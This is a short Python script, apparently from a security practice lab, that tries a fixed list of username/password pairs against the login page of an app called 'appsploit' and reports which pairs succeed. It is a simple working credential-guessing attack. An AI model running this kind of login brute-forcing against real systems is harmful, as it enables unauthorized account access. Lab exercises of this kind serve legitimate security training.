#!/usr/bin/env python3
from sys import argv
import requests as rq

try:
    appsploit_url = argv[1]
except:
    appsploit_url = "http://localhost"

appsploit_login_url = f"{appsploit_url}/login"

creds_list = [
    ("user1","user2pass"),
    ("user2","user1pass"),
    ("user1","user1pass"),
    ("user2","user2pass")
]

working_creds = list()

for cred in creds_list:
    username, password = cred
    payload = {
        "username":username,
        "password":password
    }

    #Attempt login
    res = rq.post(appsploit_login_url, payload)

    #Check for invalid user/password message
    idx = res.text.find("invalid username and/or password")

    #If invalid user/password message not found, login successful
    if idx < 0:
        print(f"Login Success: {username}, {password}")
        working_creds.append(cred)

for cred in working_creds:
    print(cred)